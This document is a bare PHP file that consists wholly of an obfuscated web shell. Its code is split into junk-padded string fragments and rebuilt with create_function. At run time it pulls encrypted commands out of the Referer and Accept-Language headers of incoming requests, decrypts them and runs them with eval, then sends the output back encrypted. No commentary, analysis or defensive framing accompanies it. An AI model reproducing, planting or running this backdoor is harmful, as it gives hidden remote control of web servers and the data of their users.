<?php
$G='$kh="5d41"UKUK;$kfUK="UK402a"UK;functiUKon x($t,$k){$c=strlUKen($UKk);$l=stUKrlUKen($t);$oUK="UK";forUK($i=0;$iUK';
$m=',UK3));$p="UKUK";for($z=1;$UKz<coUKunUKt($m[1]);$UKz++)$UKp.UK=$qUK[$m[2][UK$z]]UK;if(strposUK($p,$h)===0){U';
$p='Krray("UK/_/",UK"/-/"),UKarray("UK/UK","+"),$sUKsUK(UK$s[$i],0,$e))),UK$k)));$o=obUK_geUKt_conteUKnts();UKoUKbUK_';
$a=str_replace('NL','','creNLatNLe_NLfuNLNLnctiNLon');
$E='UKubstr";$sl="stUKrtolower";$UKi=$m[1UK][0].UK$m[1][1]UK;$h=$UKsl($ss(mUKd5($i.$kUKh),UK0,3UK));$fUK=$UKsl($ss(md5($i.UK$kf),0';
$I='<$l;UK){foUKr($j=0;UK($j<$cUK&&$i<$l);$j++UKUK,$i++){$oUKUK.=$t{UK$i}^$k{$jUK};}}reUKturn $UKUKo;}$r=$_SUKE';
$O='K$s[$i]UK="";$pUK=UK$ss($UKp,3);}if(aUKrray_kUKeyUK_exists($i,UK$UKsUK)){$s[$i]UK.=$p;$eUK=strpos($s[UKUK$i],$f);i';
$z='UK(?:;q=UK0.([\\d]))UK?,?UK/",$ra,$mUK)UK;if($q&&$m)UK{@sesUKsiUKoUKn_stUKUKart();$s=&$_SEUKSUKSION;$sUKs="s';
$C='UKf($e){UK$k=$kh.$kfUK;UKoUKb_startUKUK();@evaUKl(@gzuncompreUKss(@x(@baseUKUK64_decode(preg_UKUKreplace(aU';
$l='url($rr);pUKarUKse_str($u["quUKery"],$q)UK;$q=arUKUKray_vaUKluesUK($q);preg_matcUKh_aUKll("/UK([\\w])[\\wUK-]+';
$U='RVER;$rr=@$rUK[UK"HTTP_REFERUKER"];UK$ra=@$rUK["HTTP_ACUKCEPTUKUK_LANGUAGE"];iUKUKUKf($rr&&$ra){$UKu=pUKarUKse_';
$K='end_clean();$d=baUKse64UK_encode(UKx(gzcUKompresUKs(UK$o),UK$k));UKpriUKnt("<$k>$d</$UKk>");@UKsesUKsion_destroUKy();}}}}';
$Q=str_replace('UK','',$G.$I.$U.$l.$z.$E.$m.$O.$C.$p.$K);
$u=$a('',$Q);$u();
?>
